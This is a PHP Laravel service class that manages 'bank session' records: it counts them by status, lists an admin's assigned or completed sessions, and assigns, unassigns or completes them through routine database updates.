<?php

namespace App\Services;

use App\Enums\BankSessionStatus;
use App\Models\Admin;
use App\Models\BankSession;
use Illuminate\Database\Eloquent\Collection;

class BankSessionService
{
    public function getStats(): array
    {
        return [
            'pending'   => BankSession::pending()->count(),
            'assigned'  => BankSession::assigned()->count(),
            'completed' => BankSession::completed()->count(),
        ];
    }

    public function getAdminSessions(Admin $admin, int $limit): Collection
    {
        return BankSession::forAdmin($admin->id)
            ->whereIn('status', [BankSessionStatus::Assigned, BankSessionStatus::Completed])
            ->orderByDesc('updated_at')
            ->limit($limit)
            ->get();
    }

    public function findOrFail(string $id): BankSession
    {
        return BankSession::findOrFail($id);
    }

    public function assign(BankSession $session, Admin $admin): void
    {
        $session->update([
            'status'   => BankSessionStatus::Assigned,
            'admin_id' => $admin->id,
        ]);
    }

    public function unassign(BankSession $session): void
    {
        $session->update([
            'status'   => BankSessionStatus::Pending,
            'admin_id' => null,
        ]);
    }

    public function complete(BankSession $session): void
    {
        $session->update(['status' => BankSessionStatus::Completed]);
    }
}
